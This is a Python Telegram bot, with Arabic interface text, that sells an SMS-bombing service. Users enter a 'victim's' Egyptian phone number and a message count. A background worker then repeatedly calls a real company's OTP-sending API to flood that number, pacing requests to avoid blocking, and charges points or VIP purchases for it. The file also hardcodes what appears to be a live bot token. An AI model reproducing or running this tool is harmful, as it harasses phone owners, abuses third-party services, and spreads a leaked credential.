import logging
import sqlite3
import html
import time
import asyncio
import requests
import math
from datetime import datetime, timedelta
from typing import Optional, List, Tuple

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    User
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
    CallbackQueryHandler,
    ConversationHandler
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ⚙️ إعدادات البوت والتهيئة
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

BOT_TOKEN = "7637690071:AAE-MZYASnMZx3iq52aheHbDcq9yE2VQUjk"  # ضع توكن البوت هنا
ADMIN_ID = 8287678319  # آيدي الأدمن

# مراحل المحادثات
STATE_TRANSFER_ID, STATE_TRANSFER_AMOUNT = range(2)
STATE_CREATE_CODE = range(2)
STATE_REDEEM_CODE = range(2)
STATE_ATTACK_NUMBER, STATE_ATTACK_COUNT = range(4, 6) # مراحل الرشق
STATE_ADMIN_VIP = range(7)

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ثوابت الرشق
MESSAGES_PER_POINT = 10  # كل 1 نقطة = 10 رسائل
SEC_PER_MSG = 2.0        # تقدير الوقت لكل رسالة بالثواني (للحساب التقريبي)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🗄️ نظام قاعدة البيانات (Database Manager)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class DatabaseManager:
    def __init__(self, db_name="zaem_bot.db"):
        self.conn = sqlite3.connect(db_name, check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.create_tables()
        self.init_settings()

    def create_tables(self):
        # جدول المستخدمين (تمت إضافة is_vip)
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                full_name TEXT,
                phone TEXT,
                points INTEGER DEFAULT 20,
                referrer_id INTEGER,
                last_daily_bonus TEXT,
                joined_date TEXT,
                is_vip INTEGER DEFAULT 0  -- 0 = Free, 1 = VIP
            )
        ''')
        # جدول العمليات
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS transactions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                amount INTEGER,
                type TEXT,
                details TEXT,
                timestamp TEXT
            )
        ''')
        # جدول الأكواد
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS promo_codes (
                code TEXT PRIMARY KEY,
                points INTEGER,
                max_uses INTEGER,
                current_uses INTEGER DEFAULT 0,
                active INTEGER DEFAULT 1
            )
        ''')
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS code_usage (
                user_id INTEGER,
                code TEXT,
                PRIMARY KEY (user_id, code)
            )
        ''')
        # جدول الإعدادات
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT
            )
        ''')
        # جدول طابور الرشق (Queue)
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_queue (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                target_number TEXT,
                msg_count INTEGER,
                status TEXT DEFAULT 'pending', -- pending, processing, completed, failed
                created_at TEXT,
                finished_at TEXT
            )
        ''')
        self.conn.commit()

    def init_settings(self):
        default_settings = {"tax_percent": "25", "show_leaderboard": "1"}
        for key, val in default_settings.items():
            try:
                self.cursor.execute("INSERT INTO settings (key, value) VALUES (?, ?)", (key, val))
            except sqlite3.IntegrityError:
                pass
        self.conn.commit()

    # --- عمليات المستخدم ---
    def add_user(self, user_id, username, full_name, phone, referrer_id=None):
        try:
            date = datetime.now().isoformat()
            self.cursor.execute(
                "INSERT INTO users (user_id, username, full_name, phone, points, referrer_id, joined_date) VALUES (?, ?, ?, ?, 20, ?, ?)",
                (user_id, username, full_name, phone, referrer_id, date)
            )
            self.conn.commit()
            return True
        except sqlite3.IntegrityError:
            return False

    def get_user(self, user_id):
        self.cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        return self.cursor.fetchone()

    def update_points(self, user_id, amount, reason, details=""):
        self.cursor.execute("UPDATE users SET points = points + ? WHERE user_id = ?", (amount, user_id))
        
        tx_type = reason
        if reason == "bonus": tx_type = "🎁 مكافأة"
        elif reason == "transfer_in": tx_type = "📥 استلام"
        elif reason == "transfer_out": tx_type = "📤 تحويل"
        elif reason == "buy": tx_type = "💳 شراء"
        elif reason == "attack_cost": tx_type = "💣 تكلفة رشق"
        elif reason == "referral": tx_type = "👥 إحالة"

        self.cursor.execute(
            "INSERT INTO transactions (user_id, amount, type, details, timestamp) VALUES (?, ?, ?, ?, ?)",
            (user_id, amount, tx_type, details, datetime.now().strftime("%Y-%m-%d %H:%M"))
        )
        self.conn.commit()

    def set_vip(self, user_id, status=1):
        self.cursor.execute("UPDATE users SET is_vip = ? WHERE user_id = ?", (status, user_id))
        self.conn.commit()

    # --- عمليات الطابور (Queue) ---
    def add_attack_to_queue(self, user_id, target, count):
        date = datetime.now().isoformat()
        self.cursor.execute(
            "INSERT INTO attack_queue (user_id, target_number, msg_count, created_at) VALUES (?, ?, ?, ?)",
            (user_id, target, count, date)
        )
        self.conn.commit()
        return self.cursor.lastrowid

    def get_pending_attacks_count_before(self, attack_id):
        # حساب عدد الرسائل المجدولة قبل هذا الطلب لتقدير الوقت
        self.cursor.execute(
            "SELECT SUM(msg_count) FROM attack_queue WHERE status IN ('pending', 'processing') AND id < ?", 
            (attack_id,)
        )
        result = self.cursor.fetchone()[0]
        return result if result else 0

    def get_next_pending_attack(self):
        self.cursor.execute("SELECT * FROM attack_queue WHERE status = 'pending' ORDER BY id ASC LIMIT 1")
        return self.cursor.fetchone()

    def update_attack_status(self, attack_id, status):
        now = datetime.now().isoformat() if status in ['completed', 'failed'] else None
        self.cursor.execute(
            "UPDATE attack_queue SET status = ?, finished_at = ? WHERE id = ?", 
            (status, now, attack_id)
        )
        self.conn.commit()

    # --- عمليات الأدمن والإحصائيات ---
    def get_history(self, user_id, limit=5):
        self.cursor.execute(
            "SELECT amount, type, details, timestamp FROM transactions WHERE user_id = ? ORDER BY id DESC LIMIT ?", 
            (user_id, limit)
        )
        return self.cursor.fetchall()

    def get_top_referrers(self, limit=3):
        self.cursor.execute('''
            SELECT referrer_id, COUNT(*) as count 
            FROM users WHERE referrer_id IS NOT NULL 
            GROUP BY referrer_id ORDER BY count DESC LIMIT ?
        ''', (limit,))
        top_ids = self.cursor.fetchall()
        results = []
        for uid, count in top_ids:
            user = self.get_user(uid)
            if user: results.append((user, count))
        return results

    def get_setting(self, key):
        self.cursor.execute("SELECT value FROM settings WHERE key = ?", (key,))
        res = self.cursor.fetchone()
        return res[0] if res else None

    def set_setting(self, key, value):
        self.cursor.execute("UPDATE settings SET value = ? WHERE key = ?", (str(value), key))
        self.conn.commit()
    
    def get_global_stats(self):
        u_count = self.cursor.execute("SELECT COUNT(*) FROM users").fetchone()[0]
        pts = self.cursor.execute("SELECT SUM(points) FROM users").fetchone()[0] or 0
        tx = self.cursor.execute("SELECT COUNT(*) FROM transactions").fetchone()[0]
        # إحصائيات الرشق
        attacks = self.cursor.execute("SELECT COUNT(*) FROM attack_queue").fetchone()[0]
        return u_count, pts, tx, attacks

    # --- الأكواد ---
    def create_promo_code(self, code, points, max_uses):
        try:
            self.cursor.execute("INSERT INTO promo_codes (code, points, max_uses) VALUES (?, ?, ?)", (code, points, max_uses))
            self.conn.commit()
            return True
        except: return False

    def redeem_promo_code(self, user_id, code):
        res = self.cursor.execute("SELECT points, max_uses, current_uses, active FROM promo_codes WHERE code = ?", (code,)).fetchone()
        if not res: return "not_found"
        points, max_uses, current_uses, active = res
        if not active or current_uses >= max_uses: return "expired"
        if self.cursor.execute("SELECT * FROM code_usage WHERE user_id = ? AND code = ?", (user_id, code)).fetchone(): return "used"
        
        self.cursor.execute("UPDATE promo_codes SET current_uses = current_uses + 1 WHERE code = ?", (code,))
        self.cursor.execute("INSERT INTO code_usage (user_id, code) VALUES (?, ?)", (user_id, code))
        self.update_points(user_id, points, "code", f"Code: {code}")
        self.conn.commit()
        return points

db = DatabaseManager()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🔧 دوال مساعدة (Utils)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_user_link(user_id, name):
    return f"<a href='tg://user?id={user_id}'>{html.escape(name)}</a>"

def get_main_keyboard(user_id, is_vip):
    btns = [
        [InlineKeyboardButton("⚔️ بدء الهجوم (رشق)", callback_data="attack_start")],
        [InlineKeyboardButton("🔄 تجميع النقاط", callback_data="collect_points")],
        [InlineKeyboardButton("💸 تحويل النقاط", callback_data="transfer_start")],
        [InlineKeyboardButton("📜 سجل العمليات", callback_data="history"), 
         InlineKeyboardButton("📞 الدعم الفني", callback_data="support")]
    ]
    if user_id == ADMIN_ID:
        btns.append([InlineKeyboardButton("⚙️ لوحة الإدارة", callback_data="admin_panel")])
    return InlineKeyboardMarkup(btns)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🔥 منطق الرشق (Spam Logic)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# دالة تقوم بإرسال طلب واحد (Synchronous wrapped to run in thread)
def send_otp_request(number):
    nu = '+2' # Egypt Code default
    headers = {
        'authority': 'api.twistmena.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en',
        'content-type': 'application/json',
        'origin': 'https://account.twistmena.com',
        'referer': 'https://account.twistmena.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome Mobile Safari/537.36',
    }
    json_data = {'phoneNumber': nu + number}
    
    try:
        r = requests.post(
            'https://api.twistmena.com/account/auth/phone/sendOtp',
            headers=headers,
            json=json_data,
            timeout=5
        )
        return '"success":true' in r.text
    except:
        return False

# معالج الطابور الخلفي (Background Worker)
async def queue_worker(app: Application):
    while True:
        attack = db.get_next_pending_attack()
        
        if attack:
            att_id, user_id, target, count, _, _, _ = attack
            
            # تغيير الحالة إلى جاري التنفيذ
            db.update_attack_status(att_id, 'processing')
            
            # إشعار المستخدم ببدء التنفيذ
            try:
                await app.bot.send_message(user_id, f"🚀 <b>الطلب #{att_id}:</b> بدأ التنفيذ على {target} ({count} رسالة)...", parse_mode="HTML")
            except: pass

            success_count = 0
            # حلقة الرشق (Non-blocking using executor)
            loop = asyncio.get_running_loop()
            
            for i in range(count):
                # تشغيل الطلب في Thread منفصل لعدم تجميد البوت
                is_sent = await loop.run_in_executor(None, send_otp_request, target)
                if is_sent:
                    success_count += 1
                
                # تأخير بسيط بين الرسائل لتجنب الحظر
                await asyncio.sleep(1.5) 
            
            # إنهاء الطلب
            db.update_attack_status(att_id, 'completed')
            
            # إشعار الانتهاء
            try:
                await app.bot.send_message(
                    user_id, 
                    f"✅ <b>الطلب #{att_id} اكتمل!</b>\n🎯 الهدف: {target}\n📨 تم إرسال: {success_count}/{count} بنجاح.",
                    parse_mode="HTML"
                )
            except: pass
            
        else:
            # إذا لم يكن هناك طلبات، انتظر قليلاً
            await asyncio.sleep(5)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🚀 المعالجات (Handlers)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    args = context.args
    
    db_user = db.get_user(user.id)
    if not db_user:
        referrer_id = None
        if args and args[0].startswith("invite_"):
            try:
                inviter = int(args[0].split("_")[1])
                if inviter != user.id: referrer_id = inviter
            except: pass
        
        db.add_user(user.id, user.username, user.first_name, "None", referrer_id)
        
        if referrer_id:
            db.update_points(referrer_id, 10, "referral", f"دعوة: {user.first_name}")
            try:
                await context.bot.send_message(referrer_id, f"🔔 <b>إحالة جديدة!</b>\nحصلت على 10 نقاط لدعوة {user.first_name}", parse_mode="HTML")
            except: pass

    await send_dashboard(update, context)

async def send_dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE, edit=False):
    user = update.effective_user
    db_user = db.get_user(user.id)
    points = db_user[4]
    is_vip = db_user[8] == 1
    
    vip_badge = "💎 <b>VIP Member</b>" if is_vip else "👤 <b>Free Plan</b>"
    
    text = (
        f"مرحباً بك {get_user_link(user.id, user.first_name)} 👋\n\n"
        f"🆔 الآيدي: <code>{user.id}</code>\n"
        f"🏆 الرصيد: <b>{points} نقطة</b>\n"
        f"🏷️ الحالة: {vip_badge}\n"
        f"────────────────\n"
        f"👇 تحكم في البوت من الأسفل:"
    )
    
    kb = get_main_keyboard(user.id, is_vip)
    
    if edit and update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=kb, parse_mode="HTML")
    else:
        await update.message.reply_text(text, reply_markup=kb, parse_mode="HTML")

async def main_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    user_id = query.from_user.id
    await query.answer()

    if data == "main_menu":
        await send_dashboard(update, context, edit=True)

    elif data == "collect_points":
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔗 رابط الإحالة", callback_data="referral_page")],
            [InlineKeyboardButton("📅 المكافأة اليومية", callback_data="daily_bonus")],
            [InlineKeyboardButton("🎫 استبدال كود", callback_data="redeem_code_start")],
            [InlineKeyboardButton("💎 ترقية VIP / شراء نقاط", callback_data="buy_points_menu")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")]
        ])
        await query.edit_message_text("🔄 <b>مركز النقاط</b>\nكيف تريد تجميع النقاط؟", reply_markup=kb, parse_mode="HTML")

    elif data == "referral_page":
        link = f"https://t.me/{context.bot.username}?start=invite_{user_id}"
        leaderboard = ""
        if db.get_setting("show_leaderboard") == "1":
            top = db.get_top_referrers()
            if top:
                leaderboard = "\n\n🏆 <b>المتصدرون:</b>\n"
                for idx, (u, c) in enumerate(top, 1):
                    leaderboard += f"{idx}. {u[2]} ⇦ {c}\n"

        msg = f"🎁 <b>نظام الإحالة</b>\nاربح 10 نقاط لكل دعوة!\n🔗 رابطك:\n<code>{link}</code>{leaderboard}"
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="collect_points")]]), parse_mode="HTML")

    elif data == "daily_bonus":
        u = db.get_user(user_id)
        last = u[6]
        now = datetime.now()
        can_claim = True
        if last:
            if now - datetime.fromisoformat(last) < timedelta(hours=24): can_claim = False
        
        if can_claim:
            db.update_points(user_id, 5, "bonus")
            db.cursor.execute("UPDATE users SET last_daily_bonus = ? WHERE user_id = ?", (now.isoformat(), user_id))
            db.conn.commit()
            await query.edit_message_text("✅ حصلت على 5 نقاط مكافأة يومية!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="collect_points")]]))
        else:
            await query.answer("⏳ المكافأة متاحة كل 24 ساعة فقط.", show_alert=True)

    elif data == "buy_points_menu":
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("⭐ 20 (250 نقطة)", callback_data="buy_manual_20")],
            [InlineKeyboardButton("💎 50 (VIP مدى الحياة)", callback_data="buy_manual_50")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="collect_points")]
        ])
        await query.edit_message_text("💳 <b>المتجر اليدوي (Telegram Stars)</b>\nاختر الباقة:", reply_markup=kb, parse_mode="HTML")

    elif data in ["buy_manual_20", "buy_manual_50"]:
        stars = "20" if "20" in data else "50"
        item = "250 نقطة" if "20" in data else "عضوية VIP اللانهائية"
        msg = (
            f"⚠️ <b>شراء يدوي ({stars} ⭐️)</b>\n\n"
            f"للحصول على {item}، اتبع الخطوات:\n"
            f"1️⃣ اضغط على: @MO_3MK\n"
            f"2️⃣ أرسل هدية بقيمة <b>{stars} نجوم</b>.\n"
            f"3️⃣ انسخ الآيدي: <code>{user_id}</code> وأرسل صورة الإيصال.\n\n"
            "⏳ سيتم التفعيل يدوياً."
        )
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="buy_points_menu")]], parse_mode="HTML"))

    elif data == "history":
        hist = db.get_history(user_id)
        msg = "📜 <b>آخر العمليات:</b>\n\n" + ("\n".join([f"▪️ {t} ({a})\n   └ {d}" for a, t, d, _ in hist]) if hist else "لا يوجد.")
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")]]), parse_mode="HTML")

    elif data == "support":
        await query.edit_message_text("📞 <b>الدعم الفني</b>\n@MO_3MK", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")]]), parse_mode="HTML")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ⚔️ نظام الرشق (Conversation Handler)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "⚔️ <b>بدء الهجوم</b>\n\n"
        "أرسل رقم الضحية الآن (بدون كود الدولة، أرقام مصرية فقط):\n"
        "مثال: 010xxxxxxxx",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="cancel_attack")]])
    )
    return STATE_ATTACK_NUMBER

async def get_attack_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    number = update.message.text.strip()
    
    # تحقق بسيط من الرقم (مصر)
    if not number.isdigit() or len(number) != 11 or not number.startswith(('010', '011', '012', '015')):
        await update.message.reply_text("❌ رقم غير صالح. تأكد أنه رقم مصري مكون من 11 رقم.")
        return STATE_ATTACK_NUMBER
        
    context.user_data['attack_number'] = number
    
    user = db.get_user(update.effective_user.id)
    is_vip = user[8] == 1
    limit_msg = "∞" if is_vip else f"الحد الأقصى: {user[4] * MESSAGES_PER_POINT} رسالة"
    
    await update.message.reply_text(
        f"🎯 تم تحديد الهدف: <b>{number}</b>\n\n"
        f"أرسل عدد الرسائل التي تريد إرسالها.\n"
        f"💰 التكلفة: 1 نقطة لكل {MESSAGES_PER_POINT} رسائل.\n"
        f"📊 {limit_msg}",
        parse_mode="HTML"
    )
    return STATE_ATTACK_COUNT

async def get_attack_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        count = int(update.message.text)
        if count <= 0: raise ValueError
    except:
        await update.message.reply_text("❌ العدد يجب أن يكون رقماً صحيحاً.")
        return STATE_ATTACK_COUNT

    user_id = update.effective_user.id
    user = db.get_user(user_id)
    points = user[4]
    is_vip = user[8] == 1
    
    # حساب التكلفة
    cost = 0
    if not is_vip:
        cost = math.ceil(count / MESSAGES_PER_POINT)
        if cost > points:
            max_msgs = points * MESSAGES_PER_POINT
            await update.message.reply_text(
                f"❌ رصيدك غير كافٍ!\n"
                f"لديك {points} نقطة تكفي لـ {max_msgs} رسالة فقط.\n"
                f"المطلوب: {cost} نقطة."
            )
            return STATE_ATTACK_COUNT

    # خصم النقاط (لغير الـ VIP)
    if not is_vip and cost > 0:
        db.update_points(user_id, -cost, "attack_cost", f"رشق {count} رسالة للرقم {context.user_data['attack_number']}")

    # إضافة للطابور
    target = context.user_data['attack_number']
    attack_id = db.add_attack_to_queue(user_id, target, count)
    
    # حساب وقت الانتظار
    pending_before = db.get_pending_attacks_count_before(attack_id)
    wait_time_sec = pending_before * SEC_PER_MSG
    wait_min = int(wait_time_sec // 60)
    
    wait_msg = "⏱️ سيبدأ قريباً جداً" if wait_min < 1 else f"⏳ وقت الانتظار المقدر: {wait_min} دقيقة"
    
    vip_status = "⚡ سرعة قصوى (VIP)" if is_vip else "🐢 سرعة عادية"

    await update.message.reply_text(
        f"✅ <b>تم استلام طلبك بنجاح!</b>\n\n"
        f"🔢 رقم الطلب: <b>#{attack_id}</b>\n"
        f"🎯 الهدف: {target}\n"
        f"📨 العدد: {count} رسالة\n"
        f"💎 الحالة: {vip_status}\n"
        f"────────────────\n"
        f"{wait_msg}\n"
        f"⚠️ سيصلك إشعار عند بدء وانتهاء التنفيذ.",
        parse_mode="HTML"
    )
    
    await send_dashboard(update, context)
    return ConversationHandler.END

async def cancel_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await send_dashboard(update, context, edit=True)
    return ConversationHandler.END

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 💸 التحويل والأكواد (مختصر)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def start_transfer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    tax = db.get_setting("tax_percent")
    await query.edit_message_text(f"💸 <b>تحويل النقاط</b>\nضريبة: {tax}%\nأرسل الآيدي للمستلم:", parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="cancel_transfer")]]))
    return STATE_TRANSFER_ID

async def get_transfer_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        tid = int(update.message.text)
        if not db.get_user(tid) or tid == update.effective_user.id: raise ValueError
        context.user_data['tid'] = tid
        await update.message.reply_text("🔢 أرسل المبلغ:")
        return STATE_TRANSFER_AMOUNT
    except:
        await update.message.reply_text("❌ آيدي غير صالح.")
        return STATE_TRANSFER_ID

async def get_transfer_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        amt = int(update.message.text)
        uid = update.effective_user.id
        u = db.get_user(uid)
        if amt < 10 or amt > u[4]: raise ValueError
        
        tax_p = int(db.get_setting("tax_percent"))
        tax = int(amt * tax_p / 100)
        final = amt - tax
        
        db.update_points(uid, -amt, "transfer_out", f"إلى {context.user_data['tid']}")
        db.update_points(context.user_data['tid'], final, "transfer_in", f"من {uid}")
        
        await update.message.reply_text(f"✅ تم التحويل.\nمخصوم: {amt}\nوصل: {final}")
        try: await context.bot.send_message(context.user_data['tid'], f"💰 وصلتك {final} نقطة من {uid}.")
        except: pass
        await send_dashboard(update, context)
        return ConversationHandler.END
    except:
        await update.message.reply_text("❌ مبلغ غير صالح.")
        return STATE_TRANSFER_AMOUNT

async def cancel_conv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await send_dashboard(update, context, edit=True)
    return ConversationHandler.END

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ⚙️ الأدمن
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.callback_query.from_user.id != ADMIN_ID: return
    uc, pts, tx, atts = db.get_global_stats()
    text = f"⚙️ <b>لوحة الأدمن</b>\n👥 أعضاء: {uc}\n💰 نقاط: {pts}\n🔥 هجمات (Queue): {atts}"
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ إنشاء كود", callback_data="admin_create_code")],
        [InlineKeyboardButton("💎 تعيين VIP", callback_data="admin_set_vip_start")],
        [InlineKeyboardButton("🔙 خروج", callback_data="main_menu")]
    ])
    await update.callback_query.edit_message_text(text, reply_markup=kb, parse_mode="HTML")

async def admin_set_vip_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.edit_message_text("أرسل آيدي المستخدم لترقيته لـ VIP:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="admin_cancel")]]))
    return STATE_ADMIN_VIP

async def admin_do_vip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uid = int(update.message.text)
        db.set_vip(uid, 1)
        await update.message.reply_text(f"✅ تم ترقية المستخدم {uid} إلى VIP بنجاح.")
    except:
        await update.message.reply_text("❌ خطأ.")
    await send_dashboard(update, context)
    return ConversationHandler.END

# كود إنشاء الكوبونات واستبدالها (نفس السابق مع اختصار)
async def start_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.edit_message_text("أرسل الكود:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="cancel_conv")]]))
    return STATE_REDEEM_CODE
async def do_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    res = db.redeem_promo_code(update.effective_user.id, update.message.text.strip())
    if isinstance(res, int): await update.message.reply_text(f"🎉 حصلت على {res} نقطة.")
    else: await update.message.reply_text(f"❌ خطأ: {res}")
    await send_dashboard(update, context)
    return ConversationHandler.END

async def start_create_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.edit_message_text("أرسل: الكود\nالنقاط\nالعدد\n(كل واحدة في سطر)", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="cancel_conv")]]))
    return STATE_CREATE_CODE
async def do_create_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        l = update.message.text.split('\n')
        db.create_promo_code(l[0].strip(), int(l[1]), int(l[2]))
        await update.message.reply_text("✅ تم.")
    except: await update.message.reply_text("❌ خطأ.")
    await send_dashboard(update, context)
    return ConversationHandler.END

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🔌 التشغيل
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def main():
    app = Application.builder().token(BOT_TOKEN).build()

    # محادثة الرشق
    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(start_attack, pattern="^attack_start$")],
        states={
            STATE_ATTACK_NUMBER: [MessageHandler(filters.TEXT, get_attack_number)],
            STATE_ATTACK_COUNT: [MessageHandler(filters.TEXT, get_attack_count)]
        },
        fallbacks=[CallbackQueryHandler(cancel_attack, pattern="^cancel_attack$")]
    ))

    # محادثة التحويل
    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(start_transfer, pattern="^transfer_start$")],
        states={
            STATE_TRANSFER_ID: [MessageHandler(filters.TEXT, get_transfer_id)],
            STATE_TRANSFER_AMOUNT: [MessageHandler(filters.TEXT, get_transfer_amount)]
        },
        fallbacks=[CallbackQueryHandler(cancel_conv, pattern="^cancel_transfer$")]
    ))

    # محادثة VIP
    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(admin_set_vip_start, pattern="^admin_set_vip_start$")],
        states={STATE_ADMIN_VIP: [MessageHandler(filters.TEXT, admin_do_vip)]},
        fallbacks=[CallbackQueryHandler(admin_panel, pattern="^admin_cancel$")]
    ))
    
    # محادثات الأكواد
    app.add_handler(ConversationHandler(entry_points=[CallbackQueryHandler(start_redeem, pattern="^redeem_code_start$")], states={STATE_REDEEM_CODE: [MessageHandler(filters.TEXT, do_redeem)]}, fallbacks=[CallbackQueryHandler(cancel_conv, pattern="^cancel_conv$")]))
    app.add_handler(ConversationHandler(entry_points=[CallbackQueryHandler(start_create_code, pattern="^admin_create_code$")], states={STATE_CREATE_CODE: [MessageHandler(filters.TEXT, do_create_code)]}, fallbacks=[CallbackQueryHandler(cancel_conv, pattern="^cancel_conv$")]))

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(main_callback_handler))
    app.add_handler(CallbackQueryHandler(admin_panel, pattern="^admin_panel$"))

    # تشغيل الخلفية (Background Worker) للرشق
    loop = asyncio.get_event_loop()
    loop.create_task(queue_worker(app))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()

